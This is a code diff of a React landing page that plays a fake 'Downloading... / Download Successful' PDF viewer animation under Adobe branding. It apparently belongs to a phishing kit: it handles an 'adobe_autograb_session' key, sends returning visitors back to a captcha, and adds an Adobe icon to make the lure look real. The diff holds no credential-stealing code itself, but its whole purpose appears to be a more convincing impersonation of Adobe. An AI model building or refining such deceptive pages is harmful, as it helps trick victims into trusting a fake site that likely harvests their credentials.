@@ -6,11 +6,12 @@ interface LandingPageProps {
 
 /**
  * Behavior per request:
- * - Replace Adobe icon with a realistic PDF document "viewer" animation.
- * - Single flow: "Downloading..." -> "Download Successful" -> then hide the text,
- *   leaving the document visible plainly (no success text overlay).
- * - Texts should be clearly seen without high-contrast outlines/strokes.
+ * - Realistic PDF viewer animation.
+ * - Single flow: "Downloading..." -> "Download Successful" -> hide the text,
+ *   leaving the document visible plainly (no overlay text).
+ * - Texts are clear without high-contrast outlines.
  * - Only show the flow once per session, then remove 'adobe_autograb_session'.
+ * - The provided image is displayed inside the page frame (centered, contained).
  */
 const LandingPage: React.FC<LandingPageProps> = () => {
   const [showOverlay, setShowOverlay] = useState(false);
@@ -64,8 +65,6 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         try {
           sessionStorage.setItem(shownKey, new Date().toISOString());
         } catch {}
-
-        // Remove persisted session so a full refresh returns to captcha
         try {
           localStorage.removeItem('adobe_autograb_session');
         } catch {}
@@ -74,7 +73,7 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         hideOverlayTimeoutRef.current = window.setTimeout(() => {
           setShowOverlay(false);
           setPhase('idle');
-          setDocAnimating(false); // document remains plain (no motion) after flow
+          setDocAnimating(false);
           hideOverlayTimeoutRef.current = null;
         }, 1200) as unknown as number;
 
@@ -85,7 +84,7 @@ const LandingPage: React.FC<LandingPageProps> = () => {
       // ignore
     }
 
-  return () => {
+    return () => {
       if (dotIntervalRef.current) {
         clearInterval(dotIntervalRef.current);
         dotIntervalRef.current = null;
@@ -112,7 +111,10 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         color: '#111'
       }}
     >
-      <RealisticPDF animating={docAnimating} />
+      <RealisticPDF
+        animating={docAnimating}
+        imageUrl="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Adobe_CreatePDF_icon.png/640px-Adobe_CreatePDF_icon.png"
+      />
 
       {showOverlay && (
         <div
@@ -152,7 +154,7 @@ const LandingPage: React.FC<LandingPageProps> = () => {
   );
 };
 
-function RealisticPDF({ animating }: { animating: boolean }) {
+function RealisticPDF({ animating, imageUrl }: { animating: boolean; imageUrl: string }) {
   return (
     <div style={{ position: 'relative' }} aria-hidden="true">
       <style>
@@ -257,58 +259,50 @@ function RealisticPDF({ animating }: { animating: boolean }) {
             border-top-right-radius: 10px;
           }
 
-          /* Page content (typography lines, image block, header bar) */
+          /* Page content */
           .content {
             position: absolute;
             inset: 16px 18px 18px 18px;
+            display: flex;
+            flex-direction: column;
           }
           .header-bar {
             height: 18px;
             background: #f7fafc;
             border: 1px solid #eef2f7;
             border-radius: 6px;
-            margin-bottom: 14px;
+            margin-bottom: 12px;
           }
-          .title {
-            height: 12px;
-            width: 74%;
-            background: #eef2f7;
-            border-radius: 6px;
-            margin: 10px 0 12px 0;
+
+          /* Image preview container fills most of the page */
+          .imagePreview {
+            flex: 1;
+            border: 1px solid #dbe3ed;
+            border-radius: 8px;
+            background: #f5f8fb;
+            display: grid;
+            place-items: center;
+            overflow: hidden;
+          }
+          .imagePreview-inner {
+            width: 100%;
+            height: 100%;
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-size: contain; /* keep full image visible inside frame */
+          }
+
+          .footer-lines {
+            margin-top: 10px;
           }
           .para {
             height: 8px;
             background: #eef2f7;
             border-radius: 5px;
-            margin: 8px 0;
+            margin: 6px 0;
           }
-          .para.w1 { width: 96%; }
-          .para.w2 { width: 88%; }
-          .para.w3 { width: 92%; }
-          .para.w4 { width: 80%; }
-          .image {
-            height: 96px;
-            background: linear-gradient(135deg, #e8eef5 0%, #dae4ef 100%);
-            border: 1px solid #dbe3ed;
-            border-radius: 8px;
-            margin: 14px 0 10px 0;
-          }
-          .caption {
-            height: 8px;
-            width: 40%;
-            background: #eef2f7;
-            border-radius: 5px;
-            margin-top: 8px;
-          }
-          .page-num {
-            position: absolute;
-            bottom: 8px;
-            right: 12px;
-            height: 8px;
-            width: 28px;
-            background: #f0f3f8;
-            border-radius: 999px;
-          }
+          .para.w1 { width: 70%; }
+          .para.w2 { width: 48%; }
 
           /* Subtle lifelike motion while downloading */
           @keyframes floatDoc {
@@ -321,7 +315,6 @@ function RealisticPDF({ animating }: { animating: boolean }) {
             transform-origin: 50% 100%;
           }
 
-          /* Optional gentle 'turn' glint line on the right edge */
           .turn-glint {
             position: absolute;
             top: 10px;
@@ -340,7 +333,6 @@ function RealisticPDF({ animating }: { animating: boolean }) {
             animation: glintSweep 2.8s ease-in-out infinite;
           }
 
-          /* Respect reduced motion */
           @media (prefers-reduced-motion: reduce) {
             .page.front.anim, .page.front.anim .turn-glint { animation: none !important; }
           }
@@ -369,15 +361,17 @@ function RealisticPDF({ animating }: { animating: boolean }) {
                 <div className="turn-glint" />
                 <div className="content">
                   <div className="header-bar" />
-                  <div className="title" />
-                  <div className="para w1" />
-                  <div className="para w2" />
-                  <div className="para w3" />
-                  <div className="image" />
-                  <div className="para w1" />
-                  <div className="para w3" />
-                  <div className="para w4" />
-                  <div className="page-num" />
+                  <div className="imagePreview">
+                    <div
+                      className="imagePreview-inner"
+                      style={{ backgroundImage: `url("${imageUrl}")` }}
+                      aria-label="Document preview image"
+                    />
+                  </div>
+                  <div className="footer-lines" aria-hidden="true">
+                    <div className="para w1" />
+                    <div className="para w2" />
+                  </div>
                 </div>
               </div>
             </div>
